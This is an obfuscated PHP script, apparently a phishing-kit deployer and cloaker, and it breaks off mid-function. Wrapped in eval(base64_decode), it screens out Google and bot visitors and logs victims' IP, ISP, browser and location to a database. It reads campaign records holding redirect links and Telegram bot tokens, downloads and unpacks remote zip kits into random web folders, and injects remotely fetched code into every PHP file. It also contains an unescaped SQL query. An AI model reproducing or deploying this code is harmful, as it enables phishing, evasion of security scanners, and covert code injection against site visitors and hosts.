<?php eval(base64_decode('
 goto rQpNJ; U_1CC: $RandOP_M = Rand_XD_TF(rand(7, 7)); goto dR_C1; Wc8W9: $url = "\x68\164\x74\x70\x3a\57\57\x69\x70\55\141\x70\151\x2e\x63\157\155\x2f\160\150\x70\x2f{$StrupLom}\77\146\x69\145\x6c\x64\x73\x3d\x73\164\x61\x74\x75\x73\x2c\155\145\163\x73\x61\147\x65\54\x63\157\156\x74\x69\x6e\145\x6e\x74\x2c\143\157\156\164\x69\156\145\156\x74\103\x6f\144\145\54\143\x6f\165\x6e\164\162\171\x2c\143\157\165\156\164\162\x79\x43\x6f\144\x65\54\162\145\147\x69\x6f\156\54\162\145\x67\x69\x6f\x6e\116\141\x6d\x65\x2c\x63\x69\164\x79\x2c\144\x69\x73\164\x72\151\x63\164\54\x7a\x69\160\x2c\154\x61\x74\x2c\x6c\x6f\x6e\x2c\164\x69\x6d\145\172\x6f\156\145\54\143\x75\x72\162\145\x6e\x63\171\x2c\x69\x73\160\x2c\157\162\x67\54\x61\163\x2c\x61\x73\156\x61\x6d\x65\x2c\x72\x65\x76\145\162\163\145\54\155\x6f\142\151\x6c\145\x2c\160\162\x6f\170\x79\x2c\150\157\x73\164\151\156\147\54\161\x75\145\162\x79"; goto F1zsW; alsdG: $info = unserialize($response); goto cmta7; WOlFv: $Nopwvv = base64_decode("\145\x6d\126\x79\142\x32\x52\x68\x65\x58\116\x66\132\x47\x46\65"); goto pBZhJ; D4Qvx: ini_set("\144\151\163\x70\154\x61\x79\137\x65\x72\162\x6f\162\x73", 1); goto nEu2g; fQZve: if (is_array($directories)) { foreach ($directories as $dir) { if (basename($dir)[0] != "\56") { if (deleteDirectory($dir)) { } } } } goto lgLF0; fDeEx: $directories = glob($parentDirectory . "\x2f\52", GLOB_ONLYDIR); goto fQZve; sEs3q: if ($_SERVER["\122\x45\x51\x55\x45\123\x54\x5f\115\105\x54\110\117\x44"] === "\x50\117\x53\124") { if (!isset($_POST["\154\x6f\143\141\154\151\x70"])) { $refix = "\111\x6e\x76\x61\154\x69\x64\x20\111\120\x53"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!isset($_POST["\163\x68\157\x70\151\x64"])) { $refix = "\x49\x6e\x76\x61\x6c\x69\144\40\111\104\x20\123\x51\114"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } if (!is_dir("\167\145\142")) { if (!mkdir("\167\145\142", 511)) { die("\106\x61\151\x6c\145\x64\40\164\x6f\x20\x63\x72\145\x61\x74\145\40\167\x65\142\40\144\151\162\x65\143\164\x6f\x72\x79"); } } $folder_name = bin2hex(random_bytes(8)); $sub_folder = rand_num(4); $folder_path = "\167\145\142\x2f{$sub_folder}\57"; $zipFileUrl = $_SESSION["\x75\x72\x6c"]; $tempDir = "\164\145\x6d\160"; if (!is_dir($tempDir)) { mkdir($tempDir); } $zipFileName = "{$tempDir}\57{$folder_name}\56\x7a\151\160"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\x46\x61\x69\154\145\144\x20\164\x6f\x20\x63\x72\145\x61\164\145\x20\164\150\x65\x20\146\157\x6c\x64\145\x72\x2e"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); $extractedFiles = scandir($folder_path); foreach ($extractedFiles as $file) { if ($file !== "\56" && $file !== "\56\56") { rename($folder_path . "\57" . $file, $folder_path . $file); } } } else { echo "\106\x61\x69\x6c\x65\x64\40\x74\x6f\x20\145\x78\164\162\141\143\164\40\x74\x68\145\x20\172\x69\160\40\146\151\154\145\56"; } } else { die("\x46\141\151\154\x65\144\x20\x74\x6f\x20\144\x6f\167\156\154\157\x61\144\x20\164\150\145\40\172\x69\x70\x20\x66\x69\154\145\56"); } if (file_exists($zipFileName)) { unlink($zipFileName); } if ($_SESSION["\x69\163\160\x72\157\164\x65\143\164"] == "\x31") { $trackingFile = $folder_path . "\162\157\165\x6c\x73\56\x74\x78\x74"; $codeURL = base64_decode(base64_decode("\x59\x55\150\x53\115\x47\116\111\124\124\x5a\x4d\145\124\154\x35\127\126\x68\152\144\126\x6f\x79\x62\x44\102\x68\x53\106\x5a\160\x5a\106\x68\117\142\107\x4e\164\x54\156\x5a\x69\142\x6c\x4a\x73\131\x6d\65\x52\144\x56\x6b\171\117\130\122\115\x4d\60\64\x77\x59\62\x30\65\144\x56\x70\65\115\x58\x6c\x5a\x4d\x6c\126\x32\131\60\150\113\x64\155\106\164\x56\x6d\160\x6b\121\172\154\60\x57\x56\x64\163\x64\125\x77\x7a\121\x6e\154\151\115\x31\112\x73\127\x54\116\122\x64\127\x52\111\141\x44\x41")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $modifiedFiles = modifyFilesRecursively($folder_path, $codeToAdd, $codeToAddBottom); file_put_contents($trackingFile, implode("\12", $modifiedFiles)); } $gameid = $_SESSION["\154\157\154\x73\x6f\x75\154\163"]; $_SESSION["\154\157\143\141\x6c\144\x69\162"] = "{$folder_path}"; file_put_contents("{$folder_path}\57\x6c\157\x63\x61\154\56\x74\x78\x74", "{$StrupLom}\xa", FILE_APPEND); $fileURL = $_SESSION["\x61\160\x69"]; function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { return; } $fileContents = file_get_contents($fileURL); if ($fileContents !== false) { $localFilePath = "\167\x65\x62\x2f\x61\160\151\x2e\160\150\x70"; file_put_contents($localFilePath, $fileContents); } } if ($fileURL !== "\x41\x50\x49") { getFileContents($fileURL); } $localip = isset($_POST["\154\157\143\x61\x6c\x69\160"]) ? $_POST["\154\157\143\x61\x6c\x69\160"] : null; $domainname = isset($_POST["\x64\157\x6d\141\151\156\156\x61\x6d\x65"]) ? $_POST["\144\x6f\x6d\x61\x69\x6e\x6e\x61\x6d\145"] : null; $nextdomain = isset($_POST["\x6e\x65\x78\164\x64\x6f\155\x61\151\156"]) ? $_POST["\156\145\x78\x74\x64\157\x6d\141\151\x6e"] : null; $shopid = isset($_POST["\163\x68\x6f\x70\151\x64"]) ? $_POST["\163\x68\x6f\160\x69\x64"] : null; if ($localip !== null && $domainname !== null && $nextdomain !== null && $shopid !== null) { $directory = "\164\145\x6d\x70"; $zipFiles = glob($directory . "\52\x2e\x7a\151\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } $responseData = array("\163\164\141\164\x75\163" => "\163\165\143\143\x65\163\x73", "\x62\x61\x63\153\137\144\x69\x72" => $folder_path, "\x62\x61\x63\x6b\137\165\x72\x6c" => $nextdomain, "\142\x61\143\153\137\x69\x64" => $shopid, "\x6d\x65\x73\163\141\x67\145" => "\104\141\x74\141\x20\163\x75\143\143\x65\x73\163\x66\x75\x6c\154\x79"); $responseJson = json_encode($responseData); echo $responseJson; } else { http_response_code(400); $responseData = array("\x73\x74\x61\164\165\163" => "\64\60\x30", "\142\141\143\153\x5f\x64\x69\162" => '', "\x62\x61\143\153\137\165\162\154" => '', "\142\x61\143\153\137\x69\144" => '', "\155\145\x73\x73\x61\147\x65" => "\104\141\x74\141\40\x6d\151\163\163\151\156\x67"); $responseJson = json_encode($responseData); echo $responseJson; $refix = "\155\151\163\x73\151\x6e\x67\x20\x64\x61\164\141"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } } else { http_response_code(405); $responseData = array("\163\x74\x61\164\165\163" => "\x34\x30\x35", "\142\141\x63\x6b\137\144\151\x72" => '', "\142\141\143\153\137\165\x72\x6c" => '', "\142\x61\143\153\x5f\151\x64" => '', "\155\x65\x73\x73\x61\x67\x65" => "\x44\x61\164\x61\40\151\x6e\166\x61\x6c\151\x64"); $responseJson = json_encode($responseData); echo $responseJson; $refix = "\151\x6e\x76\x61\154\x69\144\40\144\141\x74\x61"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto OzkZm; nhioc: $Fixbom = base64_decode("\145\155\x56\171\142\x32\122\x68\145\130\x4e\x66\x5a\107\106\x35"); goto CQCEq; VYP5S: $_SESSION["\x4e\x6a\157\160\x66"] = isset($info["\x63\157\165\156\x74\x72\171\x43\157\144\145"]) ? $info["\x63\x6f\165\156\x74\x72\171\x43\x6f\144\x65"] : null; goto NcRyF; F1zsW: $curl = curl_init($url); goto yH7hd; cmta7: $_SESSION["\151\x73\x70"] = isset($info["\151\x73\x70"]) ? $info["\151\x73\160"] : null; goto ErPco; dR_C1: $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); goto CUI0S; Lwoqc: if (!empty($validIPs)) { $StrupLom = $validIPs[0]; } else { $StrupLom = "\x31\62\x37\x2e\60\56\x30\x2e\x31"; } goto wAsA_; sFDoK: $userAgent = isset($_SERVER["\x48\124\124\x50\137\x55\123\x45\122\x5f\x41\x47\105\x4e\124"]) ? $_SERVER["\110\124\x54\x50\x5f\125\123\105\x52\137\101\x47\105\116\x54"] : ''; goto fgdye; K952g: if (isset($_POST["\x73\x68\157\160\151\x64"])) { $gameid = $_POST["\x73\150\x6f\160\x69\x64"]; $_SESSION["\x6c\x6f\154\163\x6f\x75\154\x73"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); } goto Klr01; sd7NV: $TIME_DATE = date("\131\55\x6d\55\x64\x20\x48\72\x69\72\x73"); goto ntkNj; ow29s: if (strpos($userAgent, "\147\x6f\x6f\x67\x6c\145") !== false) { $refix = "\x42\x6f\163\145\x20\107"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto xsjCl; xsjCl: if (strpos(gethostbyaddr($StrupLom), "\147\x6f\x6f\147\154\x65") !== false) { $refix = "\x42\157\x73\x65\x20\107\40\x32"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto U_1CC; T4wwV: function deleteDirectory($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } $time_diff = time() - filectime($dir); if ($time_diff > 290) { foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\56\56") { continue; } if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } else { return true; } } goto uimc9; MOheY: if ($ipMatches) { $validIPs = $matches[0]; } goto Lwoqc; fXH31: $hosting = isset($info["\150\157\x73\x74\x69\156\147"]) ? $info["\x68\157\163\x74\151\156\147"] : null; goto mMGHj; fgdye: $OKJIVGRD = HYT_DDR_Uio($userAgent); goto NvuxX; Klr01: function RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $id) { $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\x43\x6f\156\x6e\x65\143\164\x69\157\156\40\146\141\151\x6c\145\144\72\x20" . mysqli_connect_error()); } $sql_u = "\x53\105\x4c\105\103\x54\x20\x2a\40\x46\x52\x4f\115\40\x72\x65\x64\x69\162\143\x74\151\157\156\x20\127\110\x45\122\105\x20\151\144\75\x27{$id}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\x6c\x69\x6e\x6b"] = base64_decode(base64_decode($row["\154\151\156\153"])); $_SESSION["\143\156"] = explode("\73", base64_decode(base64_decode($row["\143\157\x75\156\164\x72\171"]))); $_SESSION["\160\x69\143"] = $row["\x70\x69\x63"]; $_SESSION["\x6d\163\147"] = base64_decode(base64_decode($row["\155\x73\147"])); $_SESSION["\145\170\160"] = $row["\x65\x78\160\x69\x72\x65"]; $_SESSION["\x73\145\x72\x76\145\162"] = base64_decode(base64_decode($row["\x73\x65\162\x76\145\162"])); $_SESSION["\165\162\x6c"] = base64_decode(base64_decode($row["\x75\162\x6c"])); $_SESSION["\x6c\x75\x78\x63\141\x70\x74\x63\x68\141"] = $row["\154\165\x78\x63\141\160\164\143\150\141"]; $_SESSION["\164\157\x6b\145\156\x74\x65\154"] = base64_decode(base64_decode($row["\x74\x6f\x6b\x65\156\164\x65\154"])); $_SESSION["\151\x64\x74\x65\x6c"] = base64_decode(base64_decode($row["\x69\x64\x74\x65\x6c"])); $_SESSION["\162\x65\x64\x69\162\151\143\164"] = $row["\x72\145\x64\151\162\151\143\164"]; $_SESSION["\160\x72\157\152\145\143\164"] = $row["\160\162\157\x6a\x65\143\x74"]; $_SESSION["\x61\x70\151"] = $row["\141\x70\x69"]; $_SESSION["\x61\144\144\142\x79"] = $row["\141\144\x64\142\171"]; $_SESSION["\151\163\160\x72\x6f\164\145\x63\164"] = $row["\x69\x73\160\162\157\x74\145\x63\x74"]; if (isset($_GET["\166\163\x73"])) { setcookie("\164\157\153\145\156\164\145\154", $_SESSION["\x74\x6f\x6b\145\x6e\164\x65\154"], time() + 86400 * 30, "\x2f"); setcookie("\151\x64\x74\145\154", $_SESSION["\x69\144\164\145\x6c"], time() + 86400 * 30, "\x2f"); setcookie("\162\145\144\x69\x72\151\x63\164", $_SESSION["\162\145\144\151\x72\151\143\164"], time() + 86400 * 30, "\x2f"); setcookie("\160\162\x6f\x6a\145\x63\164", $_SESSION["\160\162\157\x6a\x65\143\164"], time() + 86400 * 30, "\x2f"); setcookie("\163\x6f\x75\x72\x63\145\155\x65", $_SESSION["\x61\x64\144\x62\x79"], time() + 86400 * 30, "\57"); } } } else { $refix = "\x70\x72\x6f\152\x65\143\x74\40\111\104\x20\x6e\x6f\x74\x20\x66\157\165\156\144\40\x69\144\56{$id}"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } mysqli_close($db); } goto zkK7Z; yH7hd: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto SOSA2; Tegvu: if (isset($_GET["\x65\156\x64\155\x65\x6c\x75\x78"])) { $redi = $_COOKIE["\162\x65\144\x69\x72\151\143\164"]; $vdir = $_GET["\x65\156\x64\155\145\154\x75\170"]; $directoryToDelete = "\x77\x65\142\x2f" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\74\163\143\x72\x69\160\x74\40\114\101\x4e\x47\x55\x41\107\x45\75\47\x4a\141\x76\141\x53\143\162\151\160\x74\47\x3e\xa\40\40\x20\x20\167\151\156\144\x6f\167\56\154\x6f\143\141\x74\x69\x6f\156\56\x68\162\x65\x66\x3d\47{$redi}\x27\73\12\40\x20\x20\40\74\57\x73\143\162\151\x70\164\x3e"; die; } goto Zjizl; fcY4v: if (!Cub_JRRD_OP($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv)) { http_response_code(405); $responseData = array("\163\164\141\x74\165\163" => "\64\60\65", "\142\x61\143\x6b\137\144\x69\x72" => '', "\x62\x61\x63\153\x5f\x75\x72\x6c" => '', "\x62\141\x63\153\137\151\144" => '', "\155\x65\x73\163\x61\x67\145" => "\150\x65\154\x6c\x20\x69\156\x76\x61\154\x69\144"); $responseJson = json_encode($responseData); echo $responseJson; die; } goto Tegvu; MumqJ: $_SESSION["\x6d\157\x62\x69\x6c\145"] = $mobile == 1 ? "\124\x72\165\145" : "\106\x61\154\x73\x65"; goto fXH31; NrYuq: $domain = $_SERVER["\x48\x54\x54\x50\137\x48\x4f\123\x54"]; goto S6pjk; JOvW5: function FOx_TGH_X($USER_AGENT) { $BROWSER_ERROR = "\x55\x6e\x6b\x6e\x6f\x77\156\40\x42\162\157\x77\163\145\x72"; $BROWSER = array("\57\x6d\x73\x69\145\57\x69" => "\111\x6e\164\145\162\156\145\164\x20\x45\170\160\154\157\162\x65\162", "\x2f\146\x69\x72\145\146\x6f\170\x2f\151" => "\x46\x69\x72\145\x66\157\x78", "\x2f\x73\x61\146\x61\162\x69\57\151" => "\123\x61\x66\141\x72\x69", "\57\143\x68\x72\x6f\x6d\x65\57\151" => "\x43\x68\x72\157\155\145", "\x2f\x65\144\147\145\x2f\151" => "\x45\144\x67\x65", "\x2f\157\x70\145\x72\141\x2f\x69" => "\x4f\x70\145\162\141", "\57\x6e\x65\x74\x73\143\141\160\145\57\151" => "\116\x65\164\x73\143\141\160\x65", "\x2f\x6d\141\x78\x74\150\157\x6e\x2f\x69" => "\x4d\x61\x78\x74\x68\x6f\x6e", "\x2f\x6b\157\156\x71\x75\x65\162\157\162\x2f\x69" => "\113\x6f\156\x71\x75\x65\162\x6f\x72", "\x2f\155\x6f\x62\151\x6c\x65\57\151" => "\x48\x61\x6e\144\150\145\x6c\144\40\102\x72\x6f\167\163\145\x72"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto sFDoK; SNUtR: function HYT_DDR_Uio($USER_AGENT) { $OS_ERROR = "\x55\x6e\153\x6e\x6f\167\x6e\x20\117\123\40\120\x6c\x61\x74\x66\157\x72\x6d"; $OS = array("\57\167\x69\x6e\x64\157\167\x73\x20\156\x74\x20\61\x30\x2f\x69" => "\x57\x69\156\x64\157\167\163\x20\61\60", "\x2f\167\x69\x6e\x64\x6f\167\163\40\156\x74\x20\x36\56\63\57\x69" => "\127\x69\156\144\x6f\167\x73\x20\70\56\61", "\57\x77\151\x6e\x64\157\x77\163\40\156\164\40\x36\56\x32\57\151" => "\127\x69\x6e\144\x6f\x77\x73\x20\70", "\x2f\167\151\156\144\x6f\x77\x73\40\156\x74\x20\x36\56\x31\x2f\x69" => "\127\151\156\x64\x6f\167\163\x20\67", "\x2f\167\x69\x6e\x64\157\x77\163\x20\x6e\x74\x20\66\56\x30\x2f\x69" => "\127\x69\156\144\157\x77\163\40\x56\151\x73\x74\x61", "\57\167\x69\x6e\x64\157\x77\163\x20\x6e\x74\x20\x35\56\62\x2f\151" => "\127\151\x6e\144\x6f\167\163\40\x53\145\x72\x76\x65\x72\x20\62\60\60\63\x2f\130\x50\x20\x78\x36\x34", "\57\167\x69\156\x64\x6f\x77\163\40\156\164\x20\65\56\x31\x2f\x69" => "\x57\x69\156\144\157\167\163\x20\130\x50", "\x2f\167\x69\156\x64\157\x77\x73\x20\170\x70\x2f\151" => "\x57\151\x6e\x64\x6f\x77\163\x20\x58\120", "\x2f\x77\x69\156\x64\157\167\163\40\156\164\40\65\56\x30\x2f\151" => "\x57\151\x6e\144\x6f\167\163\x20\62\x30\x30\x30", "\x2f\167\x69\156\144\157\x77\x73\x20\155\x65\57\151" => "\127\151\156\144\157\x77\163\40\115\x45", "\57\x77\x69\156\x39\x38\57\x69" => "\x57\151\156\x64\x6f\167\x73\x20\71\70", "\57\x77\x69\x6e\71\x35\57\x69" => "\x57\151\156\x64\x6f\x77\x73\40\x39\65", "\57\x77\151\x6e\61\x36\57\151" => "\127\151\156\x64\157\x77\x73\x20\63\x2e\61\61", "\x2f\155\141\x63\151\x6e\164\x6f\x73\x68\174\x6d\141\143\40\x6f\x73\x20\170\x2f\151" => "\115\x61\x63\40\117\123\x20\x58", "\57\x6d\x61\143\137\160\x6f\167\145\x72\160\x63\57\151" => "\115\x61\143\40\x4f\x53\x20\x39", "\57\154\x69\x6e\x75\x78\57\x69" => "\114\151\x6e\165\170", "\57\165\142\165\156\164\165\x2f\151" => "\125\142\165\x6e\164\165", "\57\151\x70\150\157\156\145\57\151" => "\x69\120\150\x6f\156\x65", "\x2f\151\160\157\x64\x2f\x69" => "\151\120\157\x64", "\x2f\151\x70\x61\x64\57\151" => "\151\120\141\x64", "\x2f\141\156\x64\162\x6f\151\x64\57\151" => "\101\156\144\x72\x6f\151\x64", "\x2f\x62\x6c\x61\143\x6b\x62\145\162\162\171\x2f\151" => "\x42\x6c\x61\x63\153\102\145\162\x72\171", "\x2f\x77\x65\x62\157\x73\x2f\151" => "\x4d\x6f\142\151\154\x65"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto JOvW5; cL2Sx: function click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix) { $userAgent = isset($_SERVER["\x48\x54\x54\120\137\125\123\105\122\x5f\101\107\105\x4e\124"]) ? $_SERVER["\x48\124\x54\x50\137\125\x53\105\x52\x5f\101\107\x45\x4e\124"] : ''; $isp = $_SESSION["\151\x73\x70"]; $IpCount = FOx_TGH_X($userAgent); $OKJIVGRD = HYT_DDR_Uio($userAgent); $donflag = $_SERVER["\x53\105\x52\x56\x45\122\137\x4e\x41\115\105"]; $LOCALO_TEMPO = date("\131\55\x6d\x2d\x64\x20\x48\x3a\151\x3a\163"); $Blasacoun = $_SESSION["\x42\x6c\x61\x73\x61\143\x6f\x75\156"]; $Njopf = $_SESSION["\x4e\x6a\x6f\160\146"]; $Voprt = $_SESSION["\x56\157\160\x72\x74"]; $xOpuy = $_SESSION["\x78\117\160\x75\x79"]; $mobile = $_SESSION["\155\x6f\x62\x69\x6c\145"]; $proxy = $_SESSION["\x70\162\157\170\171\137\x72\145\x73"]; $hosting = $_SESSION["\150\x6f\x73\164\151\x6e\147"]; $host = gethostbyaddr($StrupLom); $db = mysqli_connect($datalog, $Fixbom, $Lredsvv, $Nopwvv); if (!$db) { die("\103\157\x6e\x6e\145\x63\x74\151\157\156\40\x66\141\x69\154\145\x64\72\40" . mysqli_connect_error()); } $sql_u = "\x53\105\114\x45\x43\x54\x20\52\40\x46\122\x4f\x4d\x20\154\x6f\147\x73\40\x57\110\x45\122\x45\x20\x69\x70\x61\144\x64\x72\x65\x73\x3d\47{$StrupLom}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); echo "\x21\x21"; die; } else { $StrupLom = mysqli_real_escape_string($db, str_replace("\47", '', $StrupLom)); $Blasacoun = mysqli_real_escape_string($db, str_replace("\x27", '', $Blasacoun)); $IpCount = mysqli_real_escape_string($db, str_replace("\47", '', $IpCount)); $OKJIVGRD = mysqli_real_escape_string($db, str_replace("\47", '', $OKJIVGRD)); $donflag = mysqli_real_escape_string($db, str_replace("\x27", '', $donflag)); $LOCALO_TEMPO = mysqli_real_escape_string($db, str_replace("\x27", '', $LOCALO_TEMPO)); $host = mysqli_real_escape_string($db, str_replace("\x27", '', $host)); $isp = mysqli_real_escape_string($db, str_replace("\47", '', $isp)); $refix = mysqli_real_escape_string($db, str_replace("\x27", '', $refix)); $Voprt = mysqli_real_escape_string($db, str_replace("\47", '', $Voprt)); $xOpuy = mysqli_real_escape_string($db, str_replace("\x27", '', $xOpuy)); $query = "\x49\116\x53\105\122\124\40\111\116\x54\x4f\40\x6c\x6f\x67\163\40\x28\x69\x70\141\x64\x64\162\x65\163\x2c\143\157\x75\156\164\162\171\x2c\142\162\157\167\163\x65\162\x2c\157\x73\x2c\x64\x6f\155\151\156\145\x2c\155\171\164\151\x6d\145\x2c\x68\157\163\x74\x2c\151\163\160\x2c\x72\145\x73\x6f\156\x2c\x6d\x6f\142\151\x6c\x65\x2c\160\x72\x6f\170\171\54\x68\x6f\163\164\x69\x6e\147\54\x63\151\164\171\54\162\145\147\151\x6f\x6e\51\40\12\x20\x20\x20\40\x20\x20\11\40\40\40\40\11\x20\x20\x56\101\114\x55\x45\x53\x20\x28\x27{$StrupLom}\x27\x2c\47{$Blasacoun}\x27\54\x27{$IpCount}\x27\x2c\x27{$OKJIVGRD}\47\x2c\47{$donflag}\47\x2c\x27{$LOCALO_TEMPO}\x27\x2c\47{$host}\x27\x2c\x27{$isp}\x27\54\47{$refix}\47\x2c\x27{$mobile}\x27\x2c\x27{$proxy}\47\x2c\47{$hosting}\47\x2c\47{$Voprt}\47\54\47{$xOpuy}\x27\x29"; $results = mysqli_query($db, $query); mysqli_close($db); echo "\41"; } } goto ow29s; zkK7Z: function Rand_XD_TF($length) { $characters = "\141\x62\143\x64\x65\146\152\150\x69\147\153\x6c\x6d\156\x6f\160\x71\x72\x73\164\165\166\167\170\171\172\x30\x31\62\63\64\65\66\67\70\71\x41\102\103\104\105\x46\x47\x48\x49\x4a\x4b\114\115\116\117\x50\x51\122\123\x54\125\x56\x57\x58\x59\132"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return bin2hex(random_bytes(16)); } goto An8N3; c5Tjd: $botName = is_bot_ip($StrupLom); goto eKDh8; eKDh8: if ($botName) { $refix = "\x4d\x61\151\156\40\116\x65\x77\x20\102\x6f\164\40\122\x61\156\147\145"; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); die; } goto ZpRs2; Zjizl: if (isset($_GET["\154\157\154\x6d\145"])) { $vdir = $_GET["\154\157\x6c\155\x65"]; $refix = "\111\x6e\x76\141\x6c\x69\x64\x20\154\157\x6c\x6d\x65"; $redi = $_COOKIE["\162\145\x64\151\162\x69\143\164"]; click_TYqw($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $refix); $directoryToDelete = "\x77\145\x62\x2f" . $vdir; if (is_dir($directoryToDelete)) { if (deleteDirectorynew($directoryToDelete)) { } } echo "\x3c\x73\143\x72\151\160\x74\40\114\x41\116\107\125\101\107\x45\x3d\x27\x4a\x61\x76\x61\123\x63\x72\x69\x70\x74\x27\x3e\xa\x20\40\x20\40\x77\151\x6e\144\157\x77\56\154\157\x63\141\x74\151\157\x6e\56\150\x72\x65\146\75\x27{$redi}\x27\x3b\12\40\x20\40\x20\74\57\163\x63\162\x69\x70\x74\76"; die; } goto bhKIE; nEu2g: if (session_status() == PHP_SESSION_NONE) { session_start(); } goto yijU0; dAz2j: $proxy = isset($info["\x70\162\x6f\x78\x79"]) ? $info["\160\x72\157\x78\171"] : null; goto xbft5; ATzQm: $mobile = isset($info["\x6d\157\x62\151\154\145"]) ? $info["\x6d\x6f\x62\x69\154\x65"] : null; goto MumqJ; xbft5: $_SESSION["\x70\x72\x6f\x78\171\137\x72\x65\x73"] = $proxy == 1 ? "\x54\162\x75\x65" : "\x46\x61\x6c\x73\x65"; goto ATzQm; mRP7U: $validIPs = array(); goto x1Tq0; bhKIE: if (isset($_GET["\166\x73\x73"])) { $gameid = $_GET["\163\x6f\165\x6c\163"]; $_SESSION["\x6c\157\x6c\163\157\165\154\x73"] = $gameid; RDIOPB($StrupLom, $datalog, $Fixbom, $Lredsvv, $Nopwvv, $gameid); $folder_pathx = $_GET["\x76\x73\x73"]; $RandOP_Mlux = Rand_XD_TF(rand(4, 10)); echo "\74\x73\143\x72\x69\160\164\40\114\x41\116\107\x55\101\107\105\x3d\x27\x4a\141\166\141\x53\x63\162\151\x70\164\x27\x3e\12\40\x20\40\40\167\151\x6e\144\x6f\x77\x2e\x6c\157\143\141\164\151\157\x6e\x2e\x68\162\x65\x66\75\47{$folder_pathx}\x3f\46\x76\x61\x6c\x69\x64\75{$RandOP_Mlux}{$RandOP_Mlux}\x26\141\x6c\x65\x72\x74\x3d{$RandOP_Mlux}\46\x78\x6c\x70\163\75{$RandOP_Mlux}\46\x73\157\165\x6c\x73\75{$gameid}\46\x64\157\x6e\145\x3d\46\145\162\x72\157\162\171\75{$RandOP_Mlux}\x26\x6d\156\145\155\x6f\x6e\151\x63\75\46\152\x62\75{$RandOP_Mlux}\47\x3b\12\40\40\40\x20\x3c\57\x73\x63\x72\151\160\164\x3e"; die; } goto K952g; uimc9: $parentDirectory = "\x77\x65\x62"; goto fDeEx; pBZhJ: $domine = $_SERVER["\x53\105\122\x56\x45\122\x5f\116\101\115\x45"]; goto sd7NV; TKKmc: function modifyFilesRecursively($directory, $codeToAddTop, $codeToAddBottom, $modifiedFiles = array()) { if (is_dir($directory)) { if ($handle = opendir($directory)) { while (false !== ($file = readdir($handle))) { if ($file != "\56" && $file != "\56\x2e") { $filePath = $directory . "\57" . $file; if (is_dir($filePath)) { $modifiedFiles = array_merge($modifiedFiles, modifyFilesRecursively($filePath, $codeToAddTop, $codeToAddBottom)); } elseif (pathinfo($file, PATHINFO_EXTENSION) == "\160\x68\x70" && !in_array($file, $modifiedFiles)) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; } if (strpos($fileContent, $codeToAddBottom) === false) { $fileContent .= $codeToAddBottom; } file_put_contents($filePath, $fileContent); $modifiedFiles[] = $file; } } } closedir($handle); } } return $modifiedFiles; } goto sEs3q; mMGHj: $_SESSION["\150\157\163\x74\x69\156\x67"] = $hosting == 1 ? "\x54\162\x75\145" : "\106\141\154\x73\x65"; goto Jkl3W; XtYC9: curl_close($curl); goto alsdG; Jkl3W: function deleteDirectorynew($dir) { if (!file_exists($dir)) { return true; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if ($item == "\56" || $item == "\56\x2e") { continue; } if (!deleteDirectorynew($dir . DIRECTORY_SEPARATOR . $item)) { return false; } } if (rmdir($dir)) { return true; } else { return false; } } goto T4wwV; NvuxX: $IpCount = FOx_TGH_X($userAgent); goto cL2Sx; x1Tq0: $ipMatches = preg_match_all("\57\x5c\142\134\x64\173\x31\x2c\x33\x7d\x5c\56\x5c\x64\x7b\x31\54\63\175\134\56\x5c\x64\173\61\x2c\63\x7d\134\x2e\x5c\144\x7b\x31\x2c\x33\x7d\x5c\x62\x2f", $ipAddress, $matches); goto MOheY; GHZGV: function ip_in_range($ip, $range) { list($subnet, 